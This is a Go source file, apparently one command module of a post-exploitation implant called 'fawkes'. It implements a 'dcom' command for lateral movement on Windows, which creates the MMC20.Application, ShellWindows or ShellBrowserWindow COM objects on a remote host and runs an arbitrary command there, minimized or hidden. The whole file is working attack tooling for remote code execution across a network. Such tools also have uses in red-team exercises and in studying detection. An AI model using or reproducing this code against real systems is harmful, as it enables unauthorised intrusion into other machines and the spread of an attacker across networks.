//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"unsafe"

	ole "github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
	"golang.org/x/sys/windows"

	"fawkes/pkg/structs"
)

type DcomCommand struct{}

func (c *DcomCommand) Name() string {
	return "dcom"
}

func (c *DcomCommand) Description() string {
	return "Execute commands on remote hosts via DCOM lateral movement"
}

type dcomArgs struct {
	Action  string `json:"action"`
	Host    string `json:"host"`
	Object  string `json:"object"`
	Command string `json:"command"`
	Args    string `json:"args"`
	Dir     string `json:"dir"`
}

// DCOM COM object CLSIDs
var (
	clsidMMC20          = ole.NewGUID("{49B2791A-B1AE-4C90-9B8E-E860BA07F889}")
	clsidShellWindows   = ole.NewGUID("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}")
	clsidShellBrowserWd = ole.NewGUID("{C08AFD90-F2A1-11D1-8455-00A0C91F3880}")
)

// ole32.dll for CoCreateInstanceEx
var (
	ole32DCOM                 = windows.NewLazySystemDLL("ole32.dll")
	procCoCreateInstanceEx    = ole32DCOM.NewProc("CoCreateInstanceEx")
)

// COSERVERINFO structure for remote COM activation
type coServerInfo struct {
	dwReserved1 uint32
	pwszName    *uint16
	pAuthInfo   uintptr
	dwReserved2 uint32
}

// MULTI_QI structure for interface results
type multiQI struct {
	pIID *ole.GUID
	pItf uintptr
	hr   int32
}

const clsctxRemoteServer = 0x10

func (c *DcomCommand) Execute(task structs.Task) structs.CommandResult {
	var args dcomArgs

	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required.\nActions: exec\nObjects: mmc20, shellwindows, shellbrowser",
			Status:    "error",
			Completed: true,
		}
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	switch strings.ToLower(args.Action) {
	case "exec":
		return dcomExec(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: exec", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func dcomExec(args dcomArgs) structs.CommandResult {
	if args.Host == "" {
		return structs.CommandResult{
			Output:    "Error: host is required",
			Status:    "error",
			Completed: true,
		}
	}
	if args.Command == "" {
		return structs.CommandResult{
			Output:    "Error: command is required",
			Status:    "error",
			Completed: true,
		}
	}

	object := strings.ToLower(args.Object)
	if object == "" {
		object = "mmc20"
	}

	switch object {
	case "mmc20":
		return dcomExecMMC20(args.Host, args.Command, args.Args, args.Dir)
	case "shellwindows":
		return dcomExecShellWindows(args.Host, args.Command, args.Args, args.Dir)
	case "shellbrowser":
		return dcomExecShellBrowser(args.Host, args.Command, args.Args, args.Dir)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown DCOM object: %s\nAvailable: mmc20, shellwindows, shellbrowser", args.Object),
			Status:    "error",
			Completed: true,
		}
	}
}

// createRemoteCOM creates a COM object on a remote host via CoCreateInstanceEx.
func createRemoteCOM(host string, clsid *ole.GUID) (*ole.IDispatch, error) {
	hostUTF16, err := windows.UTF16PtrFromString(host)
	if err != nil {
		return nil, fmt.Errorf("invalid host: %v", err)
	}

	serverInfo := &coServerInfo{
		pwszName: hostUTF16,
	}

	qi := multiQI{
		pIID: ole.IID_IDispatch,
	}

	ret, _, _ := procCoCreateInstanceEx.Call(
		uintptr(unsafe.Pointer(clsid)),
		0, // punkOuter
		clsctxRemoteServer,
		uintptr(unsafe.Pointer(serverInfo)),
		1, // dwCount
		uintptr(unsafe.Pointer(&qi)),
	)

	if ret != 0 {
		return nil, fmt.Errorf("CoCreateInstanceEx failed: HRESULT 0x%08X", ret)
	}
	if qi.hr != 0 {
		return nil, fmt.Errorf("interface query failed: HRESULT 0x%08X", qi.hr)
	}
	if qi.pItf == 0 {
		return nil, fmt.Errorf("CoCreateInstanceEx returned nil interface")
	}

	// Convert raw interface pointer to IDispatch
	disp := (*ole.IDispatch)(unsafe.Pointer(qi.pItf))
	return disp, nil
}

// dcomExecMMC20 executes a command via MMC20.Application DCOM object.
// Path: Document.ActiveView.ExecuteShellCommand(command, dir, args, "7")
func dcomExecMMC20(host, command, args, dir string) structs.CommandResult {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			return structs.CommandResult{
				Output:    fmt.Sprintf("CoInitializeEx failed: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}
	defer ole.CoUninitialize()

	mmc, err := createRemoteCOM(host, clsidMMC20)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to create MMC20.Application on %s: %v", host, err),
			Status:    "error",
			Completed: true,
		}
	}
	defer mmc.Release()

	// Get Document property
	docResult, err := oleutil.GetProperty(mmc, "Document")
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to get Document: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer docResult.Clear()
	doc := docResult.ToIDispatch()

	// Get ActiveView property
	viewResult, err := oleutil.GetProperty(doc, "ActiveView")
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to get ActiveView: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer viewResult.Clear()
	view := viewResult.ToIDispatch()

	// ExecuteShellCommand(Command, Directory, Parameters, WindowState)
	// WindowState "7" = SW_SHOWMINNOACTIVE (minimized, no focus)
	if dir == "" {
		dir = "C:\\Windows\\System32"
	}
	_, err = oleutil.CallMethod(view, "ExecuteShellCommand", command, dir, args, "7")
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("ExecuteShellCommand failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("DCOM MMC20.Application executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Document.ActiveView.ExecuteShellCommand", host, command, args, dir),
		Status:    "success",
		Completed: true,
	}
}

// dcomExecShellWindows executes a command via ShellWindows DCOM object.
// Path: Item().Document.Application.ShellExecute(command, args, dir, "open", 0)
func dcomExecShellWindows(host, command, args, dir string) structs.CommandResult {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			return structs.CommandResult{
				Output:    fmt.Sprintf("CoInitializeEx failed: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}
	defer ole.CoUninitialize()

	shellWin, err := createRemoteCOM(host, clsidShellWindows)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to create ShellWindows on %s: %v", host, err),
			Status:    "error",
			Completed: true,
		}
	}
	defer shellWin.Release()

	// Get Item(0) — returns an Internet Explorer / Explorer window
	itemResult, err := oleutil.CallMethod(shellWin, "Item")
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to get Item: %v (requires an explorer.exe shell on target)", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer itemResult.Clear()
	item := itemResult.ToIDispatch()

	// Get Document
	docResult, err := oleutil.GetProperty(item, "Document")
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to get Document: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer docResult.Clear()
	docDisp := docResult.ToIDispatch()

	// Get Application (returns Shell.Application)
	appResult, err := oleutil.GetProperty(docDisp, "Application")
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to get Application: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer appResult.Clear()
	app := appResult.ToIDispatch()

	// ShellExecute(File, vArgs, vDir, vOperation, vShow)
	if dir == "" {
		dir = "C:\\Windows\\System32"
	}
	_, err = oleutil.CallMethod(app, "ShellExecute", command, args, dir, "open", 0)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("ShellExecute failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("DCOM ShellWindows executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Item().Document.Application.ShellExecute", host, command, args, dir),
		Status:    "success",
		Completed: true,
	}
}

// dcomExecShellBrowser executes a command via ShellBrowserWindow DCOM object.
// Path: Document.Application.ShellExecute(command, args, dir, "open", 0)
func dcomExecShellBrowser(host, command, args, dir string) structs.CommandResult {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			return structs.CommandResult{
				Output:    fmt.Sprintf("CoInitializeEx failed: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}
	defer ole.CoUninitialize()

	browser, err := createRemoteCOM(host, clsidShellBrowserWd)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to create ShellBrowserWindow on %s: %v", host, err),
			Status:    "error",
			Completed: true,
		}
	}
	defer browser.Release()

	// Get Document
	docResult, err := oleutil.GetProperty(browser, "Document")
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to get Document: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer docResult.Clear()
	docDisp := docResult.ToIDispatch()

	// Get Application (returns Shell.Application)
	appResult, err := oleutil.GetProperty(docDisp, "Application")
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to get Application: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer appResult.Clear()
	app := appResult.ToIDispatch()

	// ShellExecute(File, vArgs, vDir, vOperation, vShow)
	if dir == "" {
		dir = "C:\\Windows\\System32"
	}
	_, err = oleutil.CallMethod(app, "ShellExecute", command, args, dir, "open", 0)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("ShellExecute failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("DCOM ShellBrowserWindow executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Document.Application.ShellExecute", host, command, args, dir),
		Status:    "success",
		Completed: true,
	}
}
